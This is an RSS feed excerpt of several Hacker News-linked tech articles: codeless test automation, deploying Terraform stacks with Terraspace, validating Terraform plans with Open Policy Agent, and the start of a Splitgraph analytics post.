<h2>Advantages of codeless test automation tools</h2>



<p><strong>1. Minimum coding skills required</strong></p>



<p>The testers need not have strong coding skills in case of codeless test automation tools.</p>



<p>Basic knowledge is acceptable since the tool itself will be taking care of the <a href="https://testsigma.com/blog/scriptless-test-automation-tool-why-testsigma/" target="_blank" rel="noreferrer noopener" aria-label="scripting part (opens in a new tab)">scripting part</a>. Usually, the user-interface of a codeless automation testing tool is such that it eradicates the complexity from the script development. The easy to understand user interface makes the test case scripting so much easier than anyone with the functional knowledge of the application can do it.</p>



<p><strong>2. Usage by stakeholders- Business Analyst, Product Owners, Subject Matter Experts</strong></p>



<p>All the stakeholders of the application are able to understand, review and discuss the test cases written using a codeless test automation tool. The absence of complex coding structure makes the test cases easier so that they can be used by the customer in UAT(User Acceptance Testing). This enhances the reusability of the test cases and also provides more depth in the communication between all the stakeholders.</p>



<p><strong>3. Time Efficiency</strong></p>



<p>The upfront time required in writing the scripts for test cases, creation of the framework, training the team and maintenance is reduced considerably.</p>



<p>The test cases can be developed in minimum time and the execution may start real quick. Moreover, once a testing framework is ready, with time and new changes the framework requires maintenance. Sometimes this becomes a major setback, especially in an Agile environment. These codeless test automation tools also employ AI/ML technologies for automatic healing of changes thus time is saved and can be utilised in other testing activities.</p>



<p><strong>4. Cross-Browser and Cross-Platform support</strong></p>



<p>We need tests to be run on multiple ranges of browsers and different platforms, a good <em>codeless test automation </em>tool accommodates all of these features.</p>



<p><strong>5. Easier Maintenance</strong></p>



<p>To design an automation testing framework is the initial step, it doesn’t conclude the automation testing framework creation. Whenever there is a requirement change and enhancement, the test scripts need to change. This becomes the most time-consuming and important task of all the automation activities.&nbsp;</p>



<p>With codeless automation testing tools, this task is as easy as the script creation. The framework provided by the tool follows a particular structure and architecture, this results in a properly managed framework. Proper structure helps in achieving better traceability and maintenance.&nbsp;</p>



<p>Also, there are tools like Testsigma that have the feature for self-healing where if a test case fails due to some minor changes in the code structure – they are corrected automatically.</p>



<p><strong>6. Reliability</strong></p>



<p>With most of the maintenance headache taken by the AI/ML capabilities. The test cases created via these tools are more reliable too. As we have seen in the above point, the <em>codeless test automation</em> tools follow a structured architecture with reusability being the key element. The multiple application type testing support, cross-browser and cross-platform support provides better coverage and hence enhances the reliability.</p>



<p><strong>7. Reusability</strong></p>



<p>The codeless test automation tools are built with the intent of reusability. The test steps which are generic and common in test cases are made reusable. Whenever needed, these reusable test steps are inserted in the test case, reducing the script size. Whenever a change occurs in the reusable script, only that test script is impacted and all other test cases are intact.</p>



<p><strong>8. Better Reporting</strong></p>



<p>In case of scripting the tests ourselves using scripting languages, we need to write custom scripts for the reporting also. For example, testNG and cucumber provide reports after the test run but still, we need to write basic code for the incorporation of the custom reports. Codeless test automation tools have the <a href="https://testsigma.com/blog/10-features-every-scriptless-automation-testing-tool-must-have/" target="_blank" rel="noreferrer noopener" aria-label="best features (opens in a new tab)">best features</a> available with them, the reporting is better and easy as compared to scripting the code ourselves.</p>



<p><strong>9. Best bet in an Agile environment</strong></p>



<p>The fast-paced code development/deployment in an Agile environment leads to lesser time for coding the automation testing scripts. In such a situation, codeless automation testing tools seem to be the best option available. We need not train the existing people in a new programming language to write test scripts. Also, the time that would be consumed in writing test scripts can be used in other testing activities like- exploratory testing, performance testing etc.</p>



<p><strong>10. Better ROI</strong></p>



<p>&nbsp;When we are working with automation testing tools/frameworks, the ROI (Return on investment)&nbsp; is a major deciding factor. Reason being the amount of time, effort, cost invested in writing and designing an automation testing framework is really high if this all is done from scratch. We need to carefully examine our requirements and the features and return the framework is going to provide. The investment we have made should not outweigh the return we will receive in future.&nbsp;</p>



<p>Because of all these initial setups and investments made in an automation testing tool, the SAF(Scriptless Automation Framework) or tool seems better where ROI is concerned. The initial test case setup and writing will be quicker and we can start the testing as soon as possible.</p>



<div>
<p><b>
Testsigma, a codeless test automation tool offers you above features along with scalable cloud infrastructure and 24 hours of dedicated support.</b></p>

</div>







<h2>Misconceptions related to codeless test automation</h2>



<p><strong>1. Scriptless means-NO script</strong></p>



<p>The name scriptless is sort of deceiving here, it doesn’t necessarily mean a complete absence of script or code. It is, however, the absence of writing the code ourselves, the code gets generated by the tool. The tool creates the script using the user-action on the application, or the tester specifies test steps using keywords or natural language. These user-actions or the keyword-based test steps are converted to the code by the tool for execution and here lies the beauty of it.</p>



<p><strong>2. Coded automation cannot be added via these tools</strong></p>



<p>Most people hear codeless and then they think that it should be limited in functionality. And if they needed to add some custom functionality then it wouldn’t be possible. But, that is not the case. There are tools like Testsigma that understand that there could be scenarios where you may want to write custom code to add custom automation capabilities. And these tools provide you with the ability to add the custom code along with the codeless scripts.</p>



<p><strong>3. It is Record-and-Playback</strong></p>



<p>Codeless test automation tools are definitely not Record-and-Playback tools. While record-and-playback we get the steps generated by the tool as per the user’s interaction with the AUT. The test data gets hardcoded into the test steps and if any changes are required, coding skills are required. If there are any changes in the application, the record-and-playback is required to be run again, because of the inflexibility of the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://testsigma.com/blog/modern-codeless-test-automation-myths-facts/">https://testsigma.com/blog/modern-codeless-test-automation-myths-facts/</a></em></p>]]>
            </description>
            <link>https://testsigma.com/blog/modern-codeless-test-automation-myths-facts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24542659</guid>
            <pubDate>Mon, 21 Sep 2020 12:46:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Terraspace All: Deploy Multiple Stacks or Terraform Modules at Once]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24542572">thread link</a>) | @tongueroo
<br/>
September 21, 2020 | https://blog.boltops.com/2020/09/19/terraspace-all-deploy-multiple-stacks-at-once | <a href="https://web.archive.org/web/*/https://blog.boltops.com/2020/09/19/terraspace-all-deploy-multiple-stacks-at-once">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
  
    <div><p><iframe src="https://www.youtube.com/embed/wxdMOOQfj2U" frameborder="0" allowfullscreen=""></iframe></p></div>
  
    <!--summary-->

<p>Today, we’ll cover a cool <a href="https://terraspace.cloud/">Terraspace</a> feature. It allows you to deploy all of your infrastructure in a single command.</p>



<p>Terraspace calculates the dependencies and deploys your code in the right order.</p>

<!--more-->

<h2 id="terraform-recommendations">Terraform Recommendations</h2>

<p>First, let’s talk about some Terraform recommendations. They recommend separating your code on a <a href="https://www.terraform.io/docs/cloud/guides/recommended-practices/part1.html#one-workspace-per-environment-per-terraform-configuration">per configuration and environment basis</a>. Here are examples straight from the docs.</p>

<ul>
  <li>billing-app-dev</li>
  <li>billing-app-prod</li>
  <li>networking-dev</li>
  <li>networking-prod</li>
</ul>

<p>Here’s a table to help explain these “scoped configurations” in different contexts:</p>

<table>
  <thead>
    <tr>
      <th>Product</th>
      <th>Scope</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Terraform Cloud</td>
      <td>A workspace</td>
    </tr>
    <tr>
      <td>Terraform OSS</td>
      <td>A terraform module with a separate statefile</td>
    </tr>
    <tr>
      <td>Terraspace</td>
      <td>A stack</td>
    </tr>
  </tbody>
</table>

<p>Believe the reasons for the strategy are because:</p>

<ol>
  <li>It avoids a monolithic structure and statefile that can take forever to run. See: <a href="https://github.com/hashicorp/terraform/issues/18981">Terraform takes a very long time to run</a>. It’s not fun to wait 20+ minutes for your <code>terraform apply</code>.</li>
  <li>It’s safer to update. Since the changes are more limited in scope, the blast radius is reduced.</li>
  <li>It helps decouple the code to logically reusable units.</li>
</ol>

<p>You deploy these “scoped configurations” separately.</p>

<h2 id="the-problem">The Problem</h2>

<p>One of the main issues with separating your code into separate stacks is that you have to deploy them independently. For example, you must manually deploy the VPC and then the instance afterward. You lose a significant advantage of what Terraform does: orchestration.</p>

<h2 id="enter-terraspace-all">Enter Terraspace All</h2>

<p>The <code>terraspace all</code> commands solves this problem by calculating the dependency graph and deploying the stacks in the correct order for you. Terraspace also parallelizes the batches. Here’s a dependency graph example.</p>

<p><img src="https://img.boltops.com/boltops/tools/terraspace/dependencies/deploy-all-a1.png" alt=""></p>

<p>Let’s deploy:</p>

<div><div><pre><code>$ terraspace all up
Will run:
   terraspace up b2 # batch 1
   terraspace up c1 # batch 1
   terraspace up c3 # batch 1
   terraspace up d1 # batch 1
   terraspace up b1 # batch 2
   terraspace up c2 # batch 2
   terraspace up b3 # batch 3
   terraspace up a1 # batch 4
Are you sure? (y/N)
</code></pre></div></div>

<p>Once you confirm, Terraspace deploys the batches in parallel. Essentially, Terraspace handles the orchestration.</p>

<div><div><pre><code>Are you sure? (y/N) y
Batch Run 1:
Running: terraspace up b2 Logs: log/up/b2.log
Running: terraspace up c1 Logs: log/up/c1.log
Running: terraspace up c3 Logs: log/up/c3.log
Running: terraspace up d1 Logs: log/up/d1.log
terraspace up b2:  Apply complete! Resources: 1 added, 0 changed, 0 destroyed.
terraspace up c1:  Apply complete! Resources: 1 added, 0 changed, 0 destroyed.
terraspace up c3:  Apply complete! Resources: 1 added, 0 changed, 0 destroyed.
terraspace up d1:  Apply complete! Resources: 1 added, 0 changed, 0 destroyed.
Batch Run 2:
Running: terraspace up b1 Logs: log/up/b1.log
Running: terraspace up c2 Logs: log/up/c2.log
terraspace up b1:  Apply complete! Resources: 1 added, 0 changed, 0 destroyed.
terraspace up c2:  Apply complete! Resources: 1 added, 0 changed, 0 destroyed.
Batch Run 3:
Running: terraspace up b3 Logs: log/up/b3.log
terraspace up b3:  Apply complete! Resources: 1 added, 0 changed, 0 destroyed.
Batch Run 4:
Running: terraspace up a1 Logs: log/up/a1.log
terraspace up a1:  Apply complete! Resources: 2 added, 0 changed, 0 destroyed.
Time took: 41s
$
</code></pre></div></div>

<p>Terraspace provides a reduced-noise summary of the runs. The full logs are also written for further inspection and debugging. The <a href="https://terraspace.cloud/reference/terraspace-log/">terraspace log</a> command is useful for viewing the logs.</p>

<h2 id="how-to-configure-dependencies">How to Configure Dependencies</h2>

<p>To configure dependencies, you merely wire stack outputs to inputs variables of another stack. Here is an example of an instance stack that depends on a vpc stack.</p>

<p>app/stacks/vpc/outputs.tf</p>

<div><div><pre><code>output "vpc_id" {
  description = "VPC ID"
  value       = aws_vpc.this.id
}
</code></pre></div></div>

<p>app/stacks/instance/variables.tf</p>

<div><div><pre><code>variable "vpc_id" {
  description = "VPC to launch instance in"
  type        = string
  default     = null
}
</code></pre></div></div>

<p>Wire them together with the <code>terraform_output</code> helper in the instance tfvars file.</p>

<p>app/stacks/instance/tfvars/base.tfvars</p>

<div><div><pre><code>vpc_id = &lt;%= terraform_output('vpc.vpc_id') %&gt;
</code></pre></div></div>

<p>Terraspace infers the dependency from this connection. It’s that simple.</p>

<p>Learn more: <a href="https://terraspace.cloud/docs/dependencies/deploy-multiple/">Deploy Multiple Stacks</a>.</p>

<h2 id="visualizing-with-graphs">Visualizing with Graphs</h2>

<p>You can create a visual dependency graph diagram with:</p>



<p>The earlier example dependency graph was generated with this command:</p>

<p><img src="https://img.boltops.com/boltops/tools/terraspace/dependencies/deploy-all-a1.png" alt=""></p>

<h2 id="targeting-subgraphs-and-subtrees">Targeting Subgraphs and Subtrees</h2>

<p>You can target subgraphs by specifying stack names. Example:</p>

<div><div><pre><code>terraspace all graph b1 b3
</code></pre></div></div>

<p>Produces:</p>

<p><img src="https://img.boltops.com/boltops/tools/terraspace/dependencies/deploy-all-a1-sub-b1-b3.png" alt=""></p>

<p>You can filter for stacks with any of all commands. Here’s an example with up:</p>

<div><div><pre><code>$ terraspace all up b1 b3
Will run:
   terraspace up c1 # batch 1
   terraspace up c3 # batch 1
   terraspace up d1 # batch 1
   terraspace up b1 # batch 2
   terraspace up c2 # batch 2
   terraspace up b3 # batch 3
Are you sure? (y/N)
</code></pre></div></div>

<p>This targets the b1 and b3 stacks and their dependencies.</p>

<h2 id="tearing-it-all-down">Tearing it All Down</h2>

<p>Finally, to tear down all the infrastructure.</p>

<div><div><pre><code>$ terraspace all down
Will run:
   terraspace down a1 # batch 1
   terraspace down b3 # batch 2
   terraspace down b1 # batch 3
   terraspace down c2 # batch 3
   terraspace down b2 # batch 4
   terraspace down c1 # batch 4
   terraspace down c3 # batch 4
   terraspace down d1 # batch 4
Are you sure? (y/N)
</code></pre></div></div>

<p>Once you’re ready, type <code>y</code> and enter.</p>

<div><div><pre><code>Are you sure? (y/N) y
Batch Run 1:
Running: terraspace down a1 Logs: log/down/a1.log
terraspace down a1:  Changes to Outputs:
terraspace down a1:  Destroy complete! Resources: 2 destroyed.
Batch Run 2:
Running: terraspace down b3 Logs: log/down/b3.log
terraspace down b3:  Changes to Outputs:
terraspace down b3:  Destroy complete! Resources: 1 destroyed.
Batch Run 3:
Running: terraspace down b1 Logs: log/down/b1.log
Running: terraspace down c2 Logs: log/down/c2.log
terraspace down b1:  Changes to Outputs:
terraspace down b1:  Destroy complete! Resources: 1 destroyed.
terraspace down c2:  Changes to Outputs:
terraspace down c2:  Destroy complete! Resources: 1 destroyed.
Batch Run 4:
Running: terraspace down b2 Logs: log/down/b2.log
Running: terraspace down c3 Logs: log/down/c3.log
Running: terraspace down d1 Logs: log/down/d1.log
Running: terraspace down c1 Logs: log/down/c1.log
terraspace down b2:  Changes to Outputs:
terraspace down b2:  Destroy complete! Resources: 1 destroyed.
terraspace down c1:  Changes to Outputs:
terraspace down c1:  Destroy complete! Resources: 1 destroyed.
terraspace down c3:  Changes to Outputs:
terraspace down c3:  Destroy complete! Resources: 1 destroyed.
terraspace down d1:  Changes to Outputs:
terraspace down d1:  Destroy complete! Resources: 1 destroyed.
Time took: 48s
$
</code></pre></div></div>

<p>The infrastructure is destroyed in reverse order.</p>

<h2 id="more-commands">More Commands</h2>

<p>There are more <a href="https://terraspace.cloud/reference/terraspace-all/">all commands</a>: <a href="https://terraspace.cloud/reference/terraspace-all-plan/">plan</a>, <a href="https://terraspace.cloud/reference/terraspace-all-up/">up</a>, <a href="https://terraspace.cloud/reference/terraspace-all-down/">down</a>, <a href="https://terraspace.cloud/reference/terraspace-all-show/">show</a>, <a href="https://terraspace.cloud/reference/terraspace-all-output/">output</a>, <a href="https://terraspace.cloud/reference/terraspace-all-graph/">graph</a>, <a href="https://terraspace.cloud/reference/terraspace-all-refresh/">refresh</a>, <a href="https://terraspace.cloud/reference/terraspace-all-providers/">providers</a>, etc. We’ve covered the essential ones to get started in this post. Learn more:</p>

<ul>
  <li><a href="https://terraspace.cloud/docs/intro/deploy-all/">Deploy All</a>: Intro docs.</li>
  <li><a href="https://terraspace.cloud/docs/dependencies/deploy-all/">Deploy Multiple</a>: Covers tfvars and some other options more closely.</li>
  <li><a href="https://terraspace.cloud/reference/terraspace-all/">Terraspace All</a>: CLI Reference Docs.</li>
  <li><a href="https://github.com/boltops-tools/terraspace-graph-demo">Terraform Graph Demo</a>: Example GitHub Repo to demonstrate deploying multiple stacks and their dependencies.</li>
</ul>

<h2 id="the-best-of-both-worlds">The Best of Both Worlds</h2>

<p>Terraspace helps you solve the issue of having to deploy individual stacks manually. Instead of having to run <code>terraspace up</code> individually, it allows you to deploy all stacks with a single command:</p>



<p>Additionally, you can target <a href="https://terraspace.cloud/docs/dependencies/subgraphs/">subgraphs</a> to deploy:</p>



<p>Lastly, you can always drop down and run the individual stack to debug. Example:</p>

<div><div><pre><code>terraspace up c1
terraspace up b1
</code></pre></div></div>

<p>Terraspace gives you the best of both worlds. To learn more about Terraspace check out <a href="https://terraspace.cloud/">terraspace.cloud</a>.</p>

  </div><div>
    <p>Thanks for reading this far. If you found this article useful, I'd really appreciate it if you share this article so others can find it too! Thanks 😁 Also follow me on <a href="https://twitter.com/tongueroo">Twitter</a>.</p>

    <p><img src="https://blog.boltops.com/img/share/social-boltops-3.gif"></p>

    <p>Got questions? Check out <a href="https://www.boltops.com/">BoltOps</a>.</p>

    

 </div></div>]]>
            </description>
            <link>https://blog.boltops.com/2020/09/19/terraspace-all-deploy-multiple-stacks-at-once</link>
            <guid isPermaLink="false">hacker-news-small-sites-24542572</guid>
            <pubDate>Mon, 21 Sep 2020 12:37:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Validating Terraform Plans with the Open Policy Agent]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24542443">thread link</a>) | @gk1
<br/>
September 21, 2020 | https://www.blokje5.dev/posts/validating-terraform-plans/ | <a href="https://web.archive.org/web/*/https://www.blokje5.dev/posts/validating-terraform-plans/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Teams in a DevOps organisation should be free to setup and manage the infrastructure for their services. Terraform is a great way to allow teams to declaratively define their infrastructure needs. However, from a compliance and security perspective, you want to place certain guardrails in place. One such guardrail is of course restricting the set of permissions the teams are given. This stops teams from deploying infrastructure your organisation does not have a need for (Most likely your teams do not need to setup <a href="https://aws.amazon.com/ground-station/">satellite connections from the cloud</a>) and prevents them from editing resources not managed by them. But it does not cover all rules and regulations that you want to enforce. You also want to ensure that teams do not create public databases, or that the naming convention of your organisation is followed.</p><p>One approach you could take is to setup an auditing service like <a href="https://aws.amazon.com/config/">AWS Config</a>:</p><blockquote><p>AWS Config is a fully managed service that provides you with an AWS resource inventory, configuration history, and configuration change notifications to enable security and governance. With AWS Config you can discover existing AWS resources, export a complete inventory of your AWS resources with all configuration details, and determine how a resource was configured at any point in time. These capabilities enable compliance auditing, security analysis, resource change tracking, and troubleshooting.</p></blockquote><p>Together with <a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-automation.html">AWS system manager automation</a> you can even automatically remediate actions based on configuration changes. For example you could automatically remove public read/write ACLs from a S3 bucket.</p><p>There are two problems with this approach however:</p><ol><li><p>It only works for AWS resources. If you have resources in multiple cloud providers or if you are deploying applications on top of Kubernetes you need to setup different tools for those environments. Which also means that you need to spend time to become familiar with those tools. Compliance regulations could be configured differently in the different environments, leading to inconsistency and potential violations of company policy.</p></li><li><p>It is applied after the resources are deployed. Of course in severe cases most likely you automatically remediate the action, meaning no manual action is required. However, there is no visibility for the team why it was changed. They might not even be aware a change happened!</p></li></ol><h2 id="introducing-the-open-policy-agent">Introducing the Open Policy Agent</h2><p>In order to remediate the previously described issues, we need a more flexible tool for our governance needs. Preferably we also would like to run the tool as a validation step before the resources are actually deployed.</p><p>Luckily for us, such a tool exists, the <a href="https://www.openpolicyagent.org/">Open Policy Agent</a>:</p><blockquote><p>Open Policy Agent (OPA) is a general-purpose policy engine with uses ranging from authorization and admission control to data filtering. OPA provides greater flexibility and expressiveness than hard-coded service logic or ad-hoc domain-specific languages. And it comes with powerful tooling to help you get started</p></blockquote><p>The Open Policy Agent allows you to define policies in based on the Rego language, which is a declarative language based on <a href="https://en.wikipedia.org/wiki/Datalog">Datalog</a>. The Open Policy Agent can be integrated into your application landscape on three ways:</p><ol><li><p>Running as a standalone server that can be queried for policy evaluation. This is great for runtime policy evaluation. For example, <a href="https://github.com/open-policy-agent/gatekeeper">integrating OPA as a Kubernetes admission controller</a>.</p></li><li><p>Using the OPA CLI as a command line tool. This could be used to evaluate policies as part of a CI/CD pipeline. For example using a tool like <a href="https://github.com/instrumenta/conftest">conftest</a> to validate infrastructure configuration.</p></li><li><p>Embedding OPA as a Go library into your application. A great example of this is <a href="https://github.com/chef/automate/tree/master/components/authz-service">Chef Automate</a>, which build an IAM system leveraging OPA.</p></li></ol><p>As you can see, OPA provides a lot of flexibility. This allows one policy to be applied in multiple ways. You no longer need to learn several proprietary tools, instead you only need to become familiar with Rego.</p><h2 id="getting-started-with-rego-policies">Getting started with Rego policies</h2><p>With OPA you query data (By default, OPA support JSON), which can be pulled in by OPA or send via its REST APIs. Along side the data, you define a set of policies which define the state of the data. For example, you could define a policy that states that all S3 buckets should have ACLs that disallow public access. These policies are written in Rego.</p><p>Rego is a declarative language, which means that a policy writer can focus more on what the policy should return, rather then on how to execute the queries. It has great support for dealing with deeply nested structures (such as JSON). It also supports many built in functions to be able to support complex policies.</p><p>The basic unit in a Rego policy is a rule. Rules allow you to make an assertion about the desired state.</p><div><pre><code data-lang="golang">sites <span>:=</span> [{<span>"name"</span>: <span>"prod"</span>}, {<span>"name"</span>: <span>"smoke1"</span>}, {<span>"name"</span>: <span>"dev"</span>}]

prod_exists { sites[_].name <span>==</span> <span>"prod"</span> }</code></pre></div><p>In the above policy, you assign an array of JSON objects to the rule <code>sites</code>. In rule <code>prod_exists</code> we make an assertion: There exists a site in sites with the name “prod”. When we query this rule with OPA, it will return true, because currently the <code>sites</code> object contains a site named “prod”. You do not have to write a for-loop over the <code>sites</code> array and write an if-statement to check if the name is equal to “prod” and then return true. You can just state the assertion and OPA will figure out how to execute the query!</p><p>We can improve on the above example by generalising the rule:</p><div><pre><code data-lang="golang">exists[name] {  name <span>:=</span> sites[_].name }</code></pre></div><p>Now the rule <code>exists</code> will return the set of all names in <code>sites</code>. We can rewrite the <code>prod_exists</code> rule as follow:</p><div><pre><code data-lang="golang">prod_exists { exists[<span>"prod"</span>] }</code></pre></div><p>Rego also support functions. There is a whole list of build in functions: Aggregation functions, Regex, Set operations, you name it. Rego also allows you to define your own functions:</p><div><pre><code data-lang="golang"><span>is_proper_url</span>(url) {
    <span>re_match</span>(<span>`https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&amp;//=]*)`</span>, url)
}</code></pre></div><p>Here we define a function <code>is_proper_url</code> which takes in a url and evaluates whether it matches a regex pattern (using the build in <code>re_match</code> function). When evaluating the query:</p><div><pre><code data-lang="golang"><span>is_proper_url</span>(<span>"https://play.openpolicyagent.org"</span>)</code></pre></div><p>This will return the value true.</p><p>Rego policies are ordered in packages:</p><div><pre><code data-lang="golang"><span>package</span> url

<span>is_proper_url</span>(url) {
    <span>re_match</span>(<span>`https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&amp;//=]*)`</span>, url)
}</code></pre></div><p>And these packages can be imported in other policies using the import statement:</p><div><pre><code data-lang="golang"><span>import</span> data.url

url.<span>is_proper_url</span>(<span>"https://play.openpolicyagent.org"</span>)</code></pre></div><p>Note that we import from data. OPA treats both policies and input (JSON) data as data.</p><p>These simple snippets hopefully show the power of a declarative language. Instead of focusing on the details, such as how to loop over an array of data, OPA will figure out how to execute the query. As a policy writer, you just make assertions on the expected state of the system. If you want to know more about writing policies in Rego, I suggest checking out <a href="https://www.openpolicyagent.org/docs/latest/how-do-i-write-policies/">the documentation</a>. There is also <a href="https://play.openpolicyagent.org/">the Rego playground</a> which allows you to play around with policies.</p><p>Next lets work on a real world example! Along the way I will show some of the more advanced features of Rego.</p><h2 id="using-the-open-policy-agent-to-validate-terraform-plans">Using the Open Policy Agent to validate Terraform plans</h2><p>Before Terraform deploys a set of resources it creates a plan of all the changes it will apply. With OPA, we can validate these plans to ensure they comply with our regulations and standards.</p><p>Now lets work on a real world situation. Lets say we have several teams working with Terraform to deploy AWS resources. We want to ensure teams apply <a href="https://aws.amazon.com/answers/account-management/aws-tagging-strategies/">AWS Tagging best practices</a>, as it allows us to easily search for resources and setup budget reports per team.</p><p>Terraform generates a terraform specific execution plan. However, OPA only understands JSON input. Luckily, Terraform 0.12 came with the ability to output plans in json (For Terraform pre 0.12, you can use <a href="https://github.com/palantir/tfjson">tfjson</a>):</p><div><pre><code data-lang="bash">terraform plan -out<span>=</span>tfplan
terraform show -json ./tfplan &gt; tfplan.json</code></pre></div><p>Terraform outputs a deeply nested JSON structure that shows both the previous state of the resources and shows the state after executing the plan. Luckily OPA shines in dealing with complicated JSON as we will see.</p><p>We will validate our policies against this JSON plan. In order to simplify the setup of our validation pipeline, we will use <a href="https://github.com/instrumenta/conftest">conftest</a>, which provides a CLI around OPA. Conftest is created to simplify running OPA to validate configuration files in automation. It also provides support for formats other then JSON, such as YAML and TOML. We can use it to validate our Terraform plan against a set of policies (by default conftest looks for a policy directory in your project):</p><div><pre><code data-lang="bash">conftest <span>test</span> tfplan.json</code></pre></div><p>Conftest by default looks for <code>deny[msg]</code> and <code>warn[msg]</code> rules, therefore providing a set of best practices on how to setup your Rego policies. The <code>msg</code> can contain additional description on why the rule was triggered. So lets set up some policies! First we will create a package to evaluate our tags:</p><div><pre><code data-lang="golang"><span>package</span> tags_validation

minimum_tags = {<span>"ApplicationRole"</span>, <span>"Owner"</span>, <span>"Project"</span>}

<span>key_val_valid_pascal_case</span>(key, val) {
    <span>is_pascal_case</span>(key)
    <span>is_pascal_case</span>(val)
}

<span>is_pascal_case</span>(<span>string</span>) {
    <span>re_match</span>(<span>`^([A-Z][a-z0-9]+)+`</span>, <span>string</span>)
}

<span>tags_contain_proper_keys</span>(tags) {
    keys <span>:=</span> {key | tags[key]}
    leftover <span>:=</span> minimum_tags <span>-</span> keys
    leftover <span>==</span> <span>set</span>()
}</code></pre></div><p>We define three functions here: <code>key_val_valid_pascal_case</code> validates whether the keys and values are proper pascal case, <code>is_pascal_case</code> is a helper function that determines whether a string is pascal case. <code>tags_contain_proper_keys</code> validates whether the tags contain atleast the minumum set of tags: ApplicationRole, Owner and Project. Note that we are using a <a href="https://www.openpolicyagent.org/docs/latest/how-do-i-write-policies/#set-comprehensions">set comprehension</a> to generate a set of keys after which we use set operations to check if the tags contain the minimum set.</p><p>Now that we have the functions in place to validate the tags, we can write the actual rules. Ideally our rules also contain some information on which resources where …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.blokje5.dev/posts/validating-terraform-plans/">https://www.blokje5.dev/posts/validating-terraform-plans/</a></em></p>]]>
            </description>
            <link>https://www.blokje5.dev/posts/validating-terraform-plans/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24542443</guid>
            <pubDate>Mon, 21 Sep 2020 12:21:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Causal Inference: The Mixtape [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24542356">thread link</a>) | @zwaps
<br/>
September 21, 2020 | http://scunning.com/cunningham_mixtape.pdf | <a href="https://web.archive.org/web/*/http://scunning.com/cunningham_mixtape.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://scunning.com/cunningham_mixtape.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24542356</guid>
            <pubDate>Mon, 21 Sep 2020 12:09:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dogfooding Splitgraph for cross-database analytics in Metabase]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24542272">thread link</a>) | @chatmasta
<br/>
September 21, 2020 | https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase | <a href="https://web.archive.org/web/*/https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><article><div><nav><ol><li><a href="#our-analytics-stack" as="#our-analytics-stack">Our analytics stack</a></li><li><a href="#how-to-bring-the-data-together" as="#how-to-bring-the-data-together">How to bring the data together?</a></li><li><a href="#sample-queries" as="#sample-queries">Sample queries</a><ol><li><a href="#federated-join" as="#federated-join">Federated JOIN</a></li></ol></li><li><a href="#data-modelling" as="#data-modelling">Data modelling</a></li><li><a href="#metabase" as="#metabase">Metabase</a><ol><li><a href="#setting-up" as="#setting-up">Setting up</a></li><li><a href="#insights" as="#insights">Insights</a></li></ol></li><li><a href="#conclusion" as="#conclusion">Conclusion</a></li></ol></nav><p><a href="https://www.splitgraph.com/" as="https://www.splitgraph.com">Splitgraph</a> is powered by data. We use <a href="https://www.metabase.com/" as="https://www.metabase.com/">Metabase</a> to build BI dashboards that can answer questions about how people interact with us. These dashboards reference our Web analytics data, user data and all events happening across the estate. We can find out how many people queried the Splitgraph <a href="https://www.splitgraph.com/connect" as="https://www.splitgraph.com/connect">Data Delivery Network</a> on a given week, how they found Splitgraph, or if they ever pulled a data image.</p><p>This works without any ETL pipelines or a data warehouse. How do we do it?</p><p>Well, we use Splitgraph.</p><p>In this post, we'll talk about our analytics stack. We'll discuss how we use Splitgraph's <a href="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction" as="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction"><code>sgr mount</code></a> command to proxy to data from Matomo, Elasticsearch and PostgreSQL. We'll show a sample SQL query that runs a federated JOIN between these three databases. Finally, we'll talk about how we use Metabase to get a clear view of the business.</p><p><img src="https://raw.githubusercontent.com/splitgraph/splitgraph.com/master/content/blog/images/20200918-splitgraph-matomo-elasticsearch-metabase/00-diagram.png"><em>Architecture diagram of our analytics setup.</em></p><section><h2 id="our-analytics-stack">Our analytics stack</h2><p>We hate third-party trackers. At the same time, we would like to know what's happening on the website and across the company in general. In the age of CDNs, a visit to a website might never reach the origin server. HTTP server logs won't show the full story about website visitors.</p><p>To solve that, we started using <strong><a href="https://matomo.org/" as="https://matomo.org/">Matomo</a></strong>. Matomo is an open-source web analytics platform. It offers a similar interface and feature set to Google Analytics. However, unlike GA, it stores all data locally in a MySQL database.</p><p>Besides visiting the website, there's a lot of other ways users can interact with Splitgraph. For example:</p><ul><li>Starring Splitgraph on GitHub or downloading a release</li><li>Querying the Splitgraph <a href="https://www.splitgraph.com/connect" as="https://www.splitgraph.com/connect">Data Delivery Network</a> from an SQL client</li><li>Pushing and pulling <a href="https://splitgraph.com/docs/concepts/images" 